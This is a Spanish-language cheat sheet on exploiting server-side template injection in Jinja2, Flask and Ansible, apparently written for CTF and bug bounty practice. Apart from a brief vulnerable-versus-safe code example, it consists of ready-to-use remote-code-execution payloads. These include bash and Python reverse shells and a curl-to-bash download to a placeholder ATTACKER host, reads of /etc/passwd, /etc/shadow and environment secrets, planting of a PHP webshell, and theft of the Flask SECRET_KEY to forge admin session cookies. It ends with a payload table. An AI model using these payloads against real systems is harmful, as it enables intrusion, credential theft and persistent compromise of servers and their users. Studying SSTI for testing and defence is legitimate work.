# Jinja2 (Python)

Jinja2 es el motor de plantillas más común en Python. Lo usan Flask (por defecto), Django (como alternativa), Ansible, SaltStack, y muchas otras herramientas. Es el motor que más aparece en CTFs y bug bounty.

```python
# Instalaciones típicas vulnerables
from flask import Flask, render_template_string, request

app = Flask(__name__)

@app.route('/')
def index():
    name = request.args.get('name', 'mundo')
    # VULNERABLE: concatenación directa
    return render_template_string(f"Hola {name}")
    # SEGURO: pasar como variable
    # return render_template_string("Hola {{ name }}", name=name)
```

### Confirmación Jinja2

```python
{{7*7}}         → 49
{{7*'7'}}       → 7777777     ← confirma Jinja2 (no Twig)
{{config}}      → <Config {'DEBUG': False, 'TESTING': False, ...}>
{{request}}     → <Request 'http://...' [GET]>
{{self}}        → <TemplateReference None>
```

### Entender la jerarquía de objetos Python

Para llegar a RCE en Jinja2 hay que navegar la jerarquía de objetos Python hasta llegar a algo que ejecute comandos del sistema. El camino más común es:

```
string → __class__ → __mro__ → object → __subclasses__()
→ buscar una subclase que tenga acceso a os, subprocess, o __builtins__
→ desde ahí llamar a os.system() o subprocess.Popen()
```

```python
# Paso 1: Llegar a la clase base 'object'
''.__class__                    # <class 'str'>
''.__class__.__mro__            # (<class 'str'>, <class 'object'>)
''.__class__.__mro__[1]         # <class 'object'>

# Paso 2: Listar todas las subclases de object
''.__class__.__mro__[1].__subclasses__()
# Devuelve lista de ~200+ clases cargadas en memoria

# Paso 3: Encontrar una clase útil
# Buscar: subprocess.Popen, warnings.catch_warnings, etc.
```

### Rutas de RCE

#### Ruta 1 — Via `os` en globals de Jinja2 (más directa)

```python
# Jinja2 expone globals del entorno en los objetos built-in del template
# cycler, joiner, namespace son objetos disponibles siempre en Jinja2

# Via cycler
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{cycler.__init__.__globals__.os.system('id')}}

# Via joiner
{{joiner.__init__.__globals__.os.popen('id').read()}}

# Via namespace
{{namespace.__init__.__globals__.os.popen('id').read()}}

# Via lipsum (función built-in de Jinja2)
{{lipsum.__globals__['os'].popen('id').read()}}
{{lipsum.__globals__.os.popen('id').read()}}
```

#### Ruta 2 — Via `request` (Flask específico)

```python
# request.application es la instancia de Flask
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Via environ
{{request.environ['werkzeug.server.shutdown']}}  # (Flask dev server)

# Via request.__class__
{{request.__class__.__mro__[1].__subclasses__()}}
```

#### Ruta 3 — Via `config` (Flask específico)

```python
# config.__class__.__init__.__globals__ da acceso a los globals del módulo Flask
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Via config.from_object si existe
{{config.__class__.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
```

#### Ruta 4 — Via subclases de `object` (más genérica)

```python
# Obtener todas las subclases
{{''.__class__.__mro__[1].__subclasses__()}}

# Necesitamos encontrar el índice de una clase útil
# Buscar 'catch_warnings' (tiene acceso a __builtins__)
# o 'Popen' (subprocess)

# Buscar el índice automáticamente
{% for i in range(500) %}
  {% if ''.__class__.__mro__[1].__subclasses__()[i].__name__ == 'catch_warnings' %}
    INDICE: {{i}}
  {% endif %}
{% endfor %}

# Una vez encontrado el índice (típicamente ~186-197 en Python 3):
{{''.__class__.__mro__[1].__subclasses__()[INDICE].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}

# Via subprocess.Popen directamente (buscar su índice)
{% for i in range(500) %}
  {% if 'Popen' in ''.__class__.__mro__[1].__subclasses__()[i].__name__ %}
    {{i}}: {{''.__class__.__mro__[1].__subclasses__()[i].__name__}}
  {% endif %}
{% endfor %}

# Usar Popen
{{''.__class__.__mro__[1].__subclasses__()[POPEN_INDEX](['id'], stdout=-1).communicate()}}
```

#### Ruta 5 — Via `__builtins__` directamente

```python
# Acceder a __builtins__ para usar __import__
{{''.__class__.__mro__[1].__subclasses__()[INDICE].__init__.__globals__['__builtins__']}}

# Si __builtins__ es un dict:
{{...['__builtins__']['__import__']('os').popen('id').read()}}
{{...['__builtins__']['eval']('__import__("os").popen("id").read()')}}

# Si __builtins__ es un módulo:
{{...__builtins__.__import__('os').popen('id').read()}}
{{...__builtins__.eval('__import__("os").popen("id").read()')}}
```

### Payloads de RCE listos para usar

```python
# ===== VERSIONES MÁS CORTAS (Flask) =====

# Via cycler — el más corto y fiable
{{cycler.__init__.__globals__.os.popen('id').read()}}

# Via lipsum — alternativa
{{lipsum.__globals__['os'].popen('id').read()}}

# Via request (requiere Flask con request context)
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}


# ===== VERSIONES UNIVERSALES (cualquier Jinja2) =====

# Via subclases — necesita encontrar el índice correcto primero
# Buscar índice:
{{''.__class__.__mro__[1].__subclasses__()}}

# Payload con índice encontrado:
{{''.__class__.__mro__[1].__subclasses__()[186].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}

# Alternativa con eval:
{{''.__class__.__mro__[1].__subclasses__()[186].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("id").read()')}}


# ===== REVERSE SHELLS =====

# Via cycler — bash
{{cycler.__init__.__globals__.os.popen("bash -c 'bash -i >& /dev/tcp/ATTACKER/9001 0>&1'").read()}}

# Via cycler — Python reverse shell
{{cycler.__init__.__globals__.os.popen("python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER\",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'").read()}}

# Via cycler — curl descarga y ejecuta
{{cycler.__init__.__globals__.os.popen('curl http://ATTACKER/shell.sh|bash').read()}}

# Via subprocess.Popen directamente
{{''.__class__.__mro__[1].__subclasses__()[POPEN_INDEX](['bash','-c','bash -i >& /dev/tcp/ATTACKER/9001 0>&1'],stdout=-1,stderr=-1).communicate()}}
```

### Leer y escribir archivos

```python
# Leer archivo
{{cycler.__init__.__globals__.os.popen('cat /etc/passwd').read()}}

# Leer con open() directamente via builtins
{{''.__class__.__mro__[1].__subclasses__()[INDICE].__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}

# Via lipsum + open
{{lipsum.__globals__['__builtins__']['open']('/etc/passwd').read()}}

# Escribir webshell al disco
{{cycler.__init__.__globals__.os.popen('echo "<?php system($_GET[cmd]); ?>" > /var/www/html/shell.php').read()}}

# Leer /etc/shadow (si el proceso corre como root)
{{cycler.__init__.__globals__.os.popen('cat /etc/shadow').read()}}
```

### Reconocimiento desde SSTI

```python
# Sistema
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('whoami').read()}}
{{cycler.__init__.__globals__.os.popen('hostname').read()}}
{{cycler.__init__.__globals__.os.popen('uname -a').read()}}

# Red
{{cycler.__init__.__globals__.os.popen('ip a').read()}}
{{cycler.__init__.__globals__.os.popen('ss -tulpn').read()}}
{{cycler.__init__.__globals__.os.popen('cat /etc/hosts').read()}}

# Aplicación
{{cycler.__init__.__globals__.os.popen('env').read()}}
{{cycler.__init__.__globals__.os.popen('cat /proc/self/environ').read()}}
{{cycler.__init__.__globals__.os.popen('find / -name "*.py" -path "*/app*" 2>/dev/null').read()}}
{{cycler.__init__.__globals__.os.popen('cat app.py').read()}}
{{cycler.__init__.__globals__.os.popen('cat config.py').read()}}
{{cycler.__init__.__globals__.os.popen('find / -name ".env" 2>/dev/null -exec cat {} ;').read()}}

# Secretos de Flask
{{config}}                          # SECRET_KEY, DATABASE_URI, etc.
{{config.items()}}
{{config['SECRET_KEY']}}            # Si se conoce la clave → forjar cookies de sesión
```

### Forjar cookies de sesión de Flask

Si se obtiene la `SECRET_KEY` de Flask, se pueden forjar cookies de sesión con cualquier contenido.

```python
# 1. Obtener la SECRET_KEY
{{config['SECRET_KEY']}}
# o
{{cycler.__init__.__globals__.os.popen('grep SECRET_KEY /app/config.py').read()}}

# 2. Forjar cookie con flask-unsign
pip3 install flask-unsign

# Decodificar la cookie actual
flask-unsign --decode --cookie "eyJ1c2VyIjoidXNlciJ9..."

# Forjar cookie con rol de admin
flask-unsign --sign --cookie "{'user': 'admin', 'role': 'admin'}" \
    --secret 'SECRET_KEY_OBTENIDA'

# 3. Usar la cookie forjada en el navegador/Burp
```

### Variables y filtros útiles de Jinja2

```python
# Listar todas las variables disponibles en el contexto del template
{{self.__dict__}}
{{config.__dict__}}

# Acceder a variables de configuración específicas
{{config.DEBUG}}
{{config.TESTING}}
{{config.SQLALCHEMY_DATABASE_URI}}   # String de conexión a DB

# Filtros built-in de Jinja2 (pueden ser útiles para bypass)
{{'id'|upper}}                       # 'ID'
{{[1,2,3]|join(',')}}               # '1,2,3'
{{'os'|attr('system')}}             # Acceso via attr() en vez de punto

# Variables globales siempre disponibles en Jinja2:
# cycler, joiner, namespace, range, lipsum, dict, class, etc.
{{dict.__class__}}
{{range.__class__}}
```

### SSTI en contextos especiales

#### En atributos HTML (output ya en HTML)

```python
# Si el template es:
# <input value="{{ name }}">
# y el input se refleja dentro del atributo

# Payload: cerrar atributo y añadir evento
" autofocus onfocus="{{cycler.__init__.__globals__.os.popen('id').read()}}
```

#### En archivos de configuración (Ansible, SaltStack)

```yaml
# Ansible — archivo de playbook vulnerable
- name: Debug
  debug:
    msg: "{{ user_input }}"  # Si user_input viene de fuera

# Payload en el input:
{{ lookup('pipe', 'id') }}
{{ lookup('file', '/etc/passwd') }}
```

### Tabla de payloads por situación

| Situación           | Payload                                                                                                                          |
| ------------------- | -------------------------------------------------------------------------------------------------------------------------------- |
| Flask — más corto   | `{{cycler.__init__.__globals__.os.popen('CMD').read()}}`                                                                         |
| Flask — alternativa | `{{lipsum.__globals__['os'].popen('CMD').read()}}`                                                                               |
| Flask con request   | `{{request.application.__globals__.__builtins__.__import__('os').popen('CMD').read()}}`                                          |
| Jinja2 genérico     | `{{''.__class__.__mro__[1].__subclasses__()[IDX].__init__.__globals__['__builtins__']['__import__']('os').popen('CMD').read()}}` |
| Leer archivo        | `{{lipsum.__globals__['__builtins__']['open']('/etc/passwd').read()}}`                                                           |
| Obtener SECRET\_KEY | `{{config['SECRET_KEY']}}`                                                                                                       |
| Reverse shell       | `{{cycler.__init__.__globals__.os.popen("bash -c 'bash -i >& /dev/tcp/ATK/9001 0>&1'").read()}}`                                 |

> &#x20;`cycler.__init__.__globals__.os` es el payload más corto y fiable para Flask. Memorizarlo es suficiente para resolver la mayoria de los SSTI de Jinja2 en CTFs y bug bounty.

> Si `cycler`, `joiner` y `namespace` no están disponibles, intentar `lipsum`  es otra función global de Jinja2 que también tiene acceso a `__globals__`.

> Obtener la `SECRET_KEY` de Flask es un hallazgo crítico aunque no se llegue a RCE: permite forjar cookies de sesión con cualquier rol o usuario, incluyendo admin.
